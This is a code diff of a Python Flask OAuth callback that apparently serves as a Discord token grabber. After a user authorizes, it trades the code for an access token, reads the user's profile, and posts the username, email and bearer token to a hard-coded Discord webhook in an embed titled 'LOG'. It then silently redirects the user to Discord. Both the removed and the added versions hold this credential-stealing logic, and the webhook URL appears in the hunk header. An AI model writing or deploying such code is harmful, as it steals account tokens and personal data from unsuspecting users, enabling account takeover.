@@ -11,37 +11,16 @@ WEB = "https://discord.com/api/webhooks/1501215100667691090/3ZWwbeqzcBxsOTKERvyF
 @app.route('/callback')
 def callback():
     code = request.args.get('code')
-    if not code:
-        return "Error", 400
-
-    data = {
-        'client_id': ID,
-        'client_secret': SEC,
-        'grant_type': 'authorization_code',
-        'code': code,
-        'redirect_uri': URI
-    }
+    if not code: return "No Code", 400
     
-    r = requests.post('https://discord.com/api/v10/oauth2/token', data=data)
-    token = r.json().get('access_token')
+    data = {'client_id':ID,'client_secret':SEC,'grant_type':'authorization_code','code':code,'redirect_uri':URI}
+    r = requests.post('https://discord.com/api/v10/oauth2/token', data=data).json()
+    tk = r.get('access_token')
 
-    if token:
-        headers = {'Authorization': f'Bearer {token}'}
-        u = requests.get('https://discord.com/api/v10/users/@me', headers=headers).json()
-        
-        payload = {
-            "embeds": [{
-                "title": "🔓 LOG",
-                "color": 16711680,
-                "fields": [
-                    {"name": "User", "value": f"{u.get('username')}", "inline": True},
-                    {"name": "Email", "value": f"{u.get('email')}", "inline": True},
-                    {"name": "Token", "value": f"``` {token} 
-```"}
-                ]
-            }]
-        }
-        requests.post(WEB, json=payload)
+    if tk:
+        u = requests.get('https://discord.com/api/v10/users/@me', headers={'Authorization':f'Bearer {tk}'}).json()
+        requests.post(WEB, json={"embeds":[{"title":"🔓 LOG","fields":[{"name":"User","value":u.get('username')},{"name":"Email","value":u.get('email')},{"name":"Token","value":f"```{tk}
+```"}]}]})
         
     return redirect("https://discord.com/app")
 
